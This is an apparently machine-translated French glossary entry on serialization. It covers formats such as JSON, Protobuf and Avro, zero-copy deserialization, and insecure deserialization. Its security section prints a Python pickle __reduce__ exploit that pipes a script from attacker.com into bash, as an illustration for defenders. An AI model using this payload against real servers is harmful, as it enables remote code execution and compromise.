# Qu'est-ce que Serialization ?

*Glossaire · Dev · Dernière mise à jour : 19 septembre 2026*

La sérialisation est le processus qui consiste à transformer des objets, des structures de données et des graphes de pointeurs alloués dynamiquement dans la mémoire vive (RAM) d'un langage de programmation en un flux d'octets plat et linéaire ou en un format textuel pouvant être transmis sur un réseau ou stocké sur un disque.

## Qu'est-ce que la sérialisation et pourquoi est-elle indispensable ? Modèle de mémoire

Dans les systèmes d'exploitation modernes, chaque processus s'exécute dans son propre espace d'adressage virtuel isolé. À l'exécution, un objet contient des variables locales sur la pile (stack), des blocs de mémoire alloués dynamiquement sur le tas (heap), des pointeurs de fonctions (vtable) et des adresses de référence (0x7ffee4b2...).

Cette structure de mémoire ne peut pas être copiée directement vers un autre environnement pour deux raisons fondamentales :

1. Isolation de l'espace d'adresses : les pointeurs mémoire n'ont de sens que dans la table d'adresses virtuelles du processus en cours d'exécution. Si vous envoyez un pointeur mémoire à un autre processus sur le même serveur ou à un client sur le réseau, cela entraînera une violation d'accès mémoire (segmentation fault) ou une corruption de la mémoire sur le système cible.
2. Différences d'architecture et d'endianness : Différentes architectures de processeur (par exemple, x86-64 en Little-Endian et le matériel réseau en Big-Endian) stockent les entiers multi-octets et les nombres à virgule flottante avec des ordres d'octets différents en mémoire. De plus, les largeurs de pointeurs et l'alignement des données (alignment/padding) diffèrent entre les systèmes 32 bits et 64 bits.

Le mécanisme de sérialisation parcourt le graphe d'objets en mémoire (y compris les références circulaires) en profondeur ou en largeur (graph traversal), convertit les pointeurs locaux en relations logiques et formate les données en une séquence d'octets canonique indépendante de la plateforme.

***Analogie :** C'est comme démonter un meuble pour le placer dans une boîte plate et rectangulaire ; à destination, vous ouvrez la boîte et, en suivant le manuel, vous réassemblez le meuble (désérialisation).*

## Formats de sérialisation : Basés sur du texte vs Binaires

Choisir le bon format de sérialisation en architecture logicielle nécessite de trouver un équilibre entre la lisibilité humaine, le coût d'analyse (parsing) du processeur, la bande passante réseau et la sécurité des types.

- JSON (JavaScript Object Notation) : C'est le standard de fait du web moderne et des API RESTful. Il est indépendant du langage, pris en charge nativement par les navigateurs, et peut être facilement lu et débogué par les développeurs.
- Inconvénients : L'analyse textuelle (lexage, tokenisation, conversions chaîne-vers-nombre) consomme beaucoup de CPU. La répétition des noms de clés (field keys) dans chaque enregistrement génère une surcharge réseau inutile (payload overhead). De plus, le transport de données binaires (par exemple, une image ou une clé chiffrée) nécessite un encodage Base64, ce qui augmente la taille des données d'environ 33 %.

- Protocol Buffers (Protobuf) : format binaire développé par Google, qui constitue l'épine dorsale de gRPC et de la communication entre microservices. Il définit les types de champs et les numéros de champs (field tags) à l'aide d'un fichier de schéma strict (.proto). Au lieu de clés textuelles, des étiquettes numériques et un encodage d'entiers à longueur variable (Varint) sont transmis sur le réseau. Par rapport au JSON, il consomme 3 à 10 fois moins de bande passante et est analysé beaucoup plus rapidement.
- Apache Avro : Il est très répandu dans l'écosystème du Big Data (Hadoop, Kafka). Le schéma, au lieu d'être intégré dans chaque message, est conservé dans un registre central (Schema Registry). Ainsi, la surcharge par message est réduite au minimum.
- MessagePack et BSON : ils conservent le modèle clé-valeur flexible et sans schéma de JSON tout en stockant les données sous une forme compressée au niveau binaire.

## Architecture de désérialisation Zero-Copy

Dans les bibliothèques de sérialisation classiques (analyseurs JSON ou Protobuf standard), le processus de désérialisation s'articule autour des étapes suivantes :

1. Le flux d'octets provenant de la socket réseau est écrit dans une mémoire tampon temporaire (buffer).
2. L'analyseur balaie les octets pour en valider les types.
3. Sur le tas (heap), une nouvelle mémoire est allouée pour chaque objet, chaîne et tableau (via malloc ou le gestionnaire de mémoire du langage).
4. Les valeurs sont copiées de la mémoire tampon vers les nouveaux objets créés dans le tas.

Dans les systèmes où des centaines de milliers de requêtes sont traitées par seconde, ces allocations de tas et ces opérations de copie entraînent une forte consommation de CPU et des temps de pause du ramasse-miettes (Garbage Collector).

**Approche Zero-Copy (FlatBuffers, Cap'n Proto) :** Dans ces bibliothèques, lors de la sérialisation des données, la structure des données en mémoire est placée dans un tampon binaire conformément à l'alignement mémoire (memory alignment) et aux adresses de décalage relatif (relative offsets).

Aucune allocation de mémoire ou copie de données n'a lieu lors de la phase de désérialisation. L'application mappe directement le tampon d'octets entrant en mémoire (mmap) et accède aux champs de l'objet par arithmétique directe des pointeurs. Le temps de désérialisation est pratiquement de 0 milliseconde. Cette architecture est la norme dans le trading haute fréquence (HFT), l'informatique en périphérie (Edge AI) et les moteurs de jeux AAA.

## Dimension de Sécurité : Désérialisation Non Sécurisée (CWE-502)

Des vulnérabilités catastrophiques surviennent lorsque la sérialisation tente de transporter non seulement des données pures, mais aussi des classes d'objets et des comportements d'exécution. Présente dans le Top 10 de l'OWASP, la désérialisation non sécurisée (Insecure Deserialization) permet à un attaquant d'exécuter du code arbitraire sur le système (Remote Code Execution - RCE).

Le module de sérialisation intégré de Python, pickle, sérialise la méthode __reduce__ des objets. Cette méthode définit une fonction à appeler lors de la désérialisation de l'objet ainsi que ses paramètres. En abusant de ce mécanisme, un attaquant peut générer une séquence d'octets malveillante qui exécute une commande du système d'exploitation :

```
# Saldırgan tarafından hazırlanan zararlı serileştirme paketi
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('curl -s https://attacker.com/steal.sh | bash',))
```

Dès que ce flux d'octets est envoyé au serveur et que pickle.loads(payload) est exécuté, une commande de shell non autorisée est exécutée sur le serveur. Par conséquent, aucune donnée provenant de sources non fiables ne doit être désérialisée avec pickle.

Dans le mécanisme de sérialisation natif de Java (ObjectInputStream.readObject()), le chargeur de classes (classloader) charge en mémoire la classe de l'objet entrant. Un attaquant peut construire une chaîne d'exécution (gadget chain) qui exécute des commandes en mémoire en connectant entre elles les méthodes de classes présentes dans les bibliothèques chargées sur le système (par exemple Apache Commons Collections ou Spring Framework).

- N'utilisez jamais de formats intégrés au langage contenant du code exécutable ou des définitions de classes (pickle Python, sérialisation native Java, unserialize PHP) au niveau des frontières réseau.
- Préférez les formats qui transportent uniquement des données brutes et valident la structure des données selon un schéma (validation de schéma stricte) (JSON + Pydantic/Zod ou Protobuf).
- Appliquez une authentification et un contrôle de l'intégrité des messages (HMAC ou TLS) lors des échanges de données binaires.

## Questions fréquentes

**Quelle est la différence fondamentale entre la sérialisation et la désérialisation ?**

La sérialisation est le processus qui consiste à convertir des objets vivants en mémoire en un flux d'octets ou de texte stockable ou transmissible. La désérialisation, quant à elle, est le processus qui consiste à lire et analyser cette séquence d'octets pour la reconvertir en un objet fonctionnel dans la mémoire du système cible.

**Dans les projets web, quand faut-il utiliser Protobuf ou FlatBuffers à la place de JSON ?**

Pour les clients web ouverts à l'internet général et les API publiques, JSON est idéal en raison de sa compatibilité avec les navigateurs et de sa facilité de débogage. Cependant, pour les microservices internes, les backends d'applications mobiles ou les flux de données en temps réel, Protobuf ou FlatBuffers doivent être privilégiés afin de réduire la bande passante réseau et le coût de traitement du processeur lié à l'analyse.

**Comment fonctionne l'attaque par désérialisation non sécurisée (Insecure Deserialization) et comment l'empêcher ?**

L'attaquant injecte des fonctions malveillantes ou des structures de classes à exécuter lors de la désérialisation dans les données sérialisées. Lorsque le serveur analyse ces données, des commandes système peuvent être déclenchées. Pour l'empêcher, les formats transportant une logique de classe doivent être abandonnés et seuls des formats schématiques transportant des données brutes (Protobuf, JSON Schema) doivent être utilisés.

**Que signifie la désérialisation sans copie (zero-copy deserialization) ?**

C'est une technique qui consiste à lire les données directement via des décalages de pointeurs dans la mémoire tampon (buffer), au lieu d'allouer de nouveaux espaces mémoire et de copier le flux d'octets entrant. En éliminant l'allocation mémoire, cela soulage le processeur et le ramasse-miettes (garbage collector).

**Qu'est-ce que l'évolution de schéma (Schema Evolution) et comment garantit-on la rétrocompatibilité et la compatibilité ascendante ?**

À mesure que le logiciel est mis à jour, les modèles de données changent. Des systèmes tels que Protobuf et Avro garantissent, en attribuant des identifiants numériques uniques aux champs, que les anciens clients ignorent les nouveaux champs (rétrocompatibilité) et que les nouveaux clients peuvent lire les anciennes données avec des valeurs par défaut (compatibilité ascendante).

## Termes liés

- [API](https://trescout.com/fr/dictionary/api/)
- [Data Pipeline](https://trescout.com/fr/dictionary/data-pipeline/)
- [Memory Management](https://trescout.com/fr/dictionary/memory-management/)
- [Network Stack](https://trescout.com/fr/dictionary/network-stack/)

## Outils liés

- [YAML Cpp](https://trescout.com/fr/discover/yaml-cpp/)

Cette explication a été rédigée en langage clair pour TreScout puis **traduite automatiquement** depuis l’original turc · la version turque fait foi. Si quelque chose vous semble erroné ou manquant, écrivez à [hello@trescout.com](mailto:hello@trescout.com). [Lire en turc →](https://trescout.com/dictionary/serialization/)

---
Source : TreScout Glossaire · https://trescout.com/fr/dictionary/serialization/
